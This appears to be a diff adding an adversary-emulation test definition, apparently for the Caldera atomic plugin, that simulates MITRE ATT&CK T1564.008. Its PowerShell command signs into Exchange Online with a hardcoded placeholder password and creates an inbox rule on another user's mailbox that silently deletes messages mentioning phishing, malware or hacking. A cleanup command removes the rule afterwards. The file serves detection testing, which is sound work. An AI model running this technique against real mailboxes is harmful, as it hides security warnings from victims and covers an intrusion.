@@ -1,0 +1,27 @@
+---
+- id: e2106e19a8eb43e20eb11504a51692be
+  name: New-Inbox Rule to Hide E-mail in M365
+  description: "This test simulates a user adding an inbox rule in M365 to delete\
+    \ emails with specific keywords in email subject or body.\n Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf\n"
+  tactic: stealth
+  technique:
+    attack_id: T1564.008
+    name: 'Hide Artifacts: Email Hiding Rules'
+  platforms:
+    unknown:
+      psh:
+        command: Import-Module ExchangeOnlineManagement; $password = ConvertTo-SecureString
+          -String "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList "john@contoso.com",
+          $password; Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue;
+          New-InboxRule -Mailbox jane@contoso.com -Name default -SubjectOrBodyContainsWords
+          ("phish","malware","hacked") -Confirm:$false -DeleteMessage:$true
+        payloads: []
+        cleanup: Import-Module ExchangeOnlineManagement; $password = ConvertTo-SecureString
+          -String "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList "john@contoso.com",
+          $password; Connect-ExchangeOnline -Credential $credential; Remove-InboxRule
+          -Mailbox jane@contoso.com -Identity default -Confirm:$false
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
